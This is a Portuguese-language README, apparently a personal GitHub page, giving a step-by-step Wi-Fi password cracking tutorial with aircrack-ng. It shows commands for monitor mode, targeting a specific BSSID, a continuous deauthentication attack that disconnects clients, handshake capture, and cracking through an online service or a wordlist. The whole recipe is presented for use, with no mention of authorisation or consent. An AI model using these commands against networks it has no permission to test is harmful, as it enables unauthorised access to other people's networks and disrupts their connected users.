# Wifi Hacking Passwords

Vamos utilizar uma metodologia de aprendizado.

Pré requisitos:
 - SO Ubuntu 22.04
 - Placa Wifi
 - Instalação dos pacotes abaixo:
```shell
apt update;apt install -y airgraph-ng aircrack-ng
```
Start check nas interface:
```shell
airmon-ng check kill && airmon-ng start wlp3s0
```
![fotowifi](https://i.postimg.cc/cJV78w8s/image.png)

Scanner do SSID Disponiveis:
```shell
airodump-ng wlp3s0
```
![fotoexpamle](https://i.postimg.cc/brqtQTYj/image.png)

Agora scanneado pega um SSID de sua escolha e visualize o canal exemplo 9.
 - Exemplo BSSID: C4:0D:96:E7:09:44
 - Canal: 9
 - verificando o Fabricante se necessário: `grep C40D96 /usr/share/ieee-data/oui.txt`
 - ![fabricanteplaca](https://i.postimg.cc/JhwtNqKd/image.png)
```shell
airodump-ng -c 9 --bssid C4:0D:96:E7:09:44 -w kelseysantos wlp3s0
```
![escanner](https://i.postimg.cc/vHcmCjNN/image.png)

Utilizando agora o Aireplay para injetar drow nos clientes:
```shell
aireplay-ng -a C4:0D:96:E7:09:44 --deauth 0 wlp3s0
```
Ele vai criar arquivos dentro da pasta um desses arquivos é o kelseysantos-01.cap onde você irá verificar se tem **handshake**, com o comando **aircrack-ng**.
```shell
aircrack-ng kelseysantos-01.cap
```
![handshake](https://i.postimg.cc/XqZ0DMYK/image.png)

Pronto agora é só utilizar um site para gerar um arquivo h22000 como o [HASHCAT](https://hashcat.net/cap2hashcat/).
 - Converta seu arquivo [kelseysantos-01.cap](https://i.postimg.cc/jjZ0xqWQ/image.png) no site, faça o upload do arquivo e clique em **convert** ele vai retornar um arquivo com extensão **.hc22000**, exemplo do arquivo: **1356859_1733616685.hc22000**.
 - Agora entre no site [www.onlinehashcrack.com](https://bit.ly/4fY5C8K) e faça o seu cadastro para upar o seu arquivo hc22000 e aguardar o resultado de uma senha.

Outra forma é utilizar um banco de palavras chamado **worldlist** ou **worldpass**, juntamente com o **aircrack-ng**, no comando abaixo:
 - Exemplo de site para baixar worldlist, [AQUI](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials).
```shell
aircrack-ng kelseysantos-01.cap -w worldlist.txt
```

Obrigado.

# Kelsey Santos

![card](https://github-readme-stats.vercel.app/api?username=kelseysantos&theme=default&show_icons=true)

![kelseysantos](https://github-readme-stats.vercel.app/api/top-langs/?username=kelseysantos&hide=html&layout=compact&theme=highcontrast)